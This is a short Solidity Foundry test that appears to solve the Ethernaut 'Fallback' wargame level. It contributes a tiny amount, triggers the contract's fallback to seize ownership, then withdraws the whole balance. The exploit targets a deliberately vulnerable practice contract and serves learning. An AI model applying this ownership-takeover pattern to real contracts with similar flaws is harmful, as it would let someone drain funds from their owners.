// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "ethernaut/levels/Fallback.sol";

contract AttackFallbackTest is Test {
    address payable instanceAddress;  
    Fallback instance;

    function setUp() public {
        instanceAddress = payable(0x7E3a7a7430193eB7092e78F1E408f77f671805A6);
        instance = Fallback(instanceAddress);
    }

    function testAttackWorks() public {
        vm.startPrank(msg.sender);
        vm.deal(msg.sender, 2);
        instance.contribute{value: 1}();
        assertEq(instanceAddress.balance, 1);
        (bool success, ) = instanceAddress.call{value: 1}("");
        require(success, "transfer failed");   
        assertEq(instance.owner(), msg.sender);
        instance.withdraw();
        assertEq(instanceAddress.balance, 0);
        vm.stopPrank();
        
    }

}
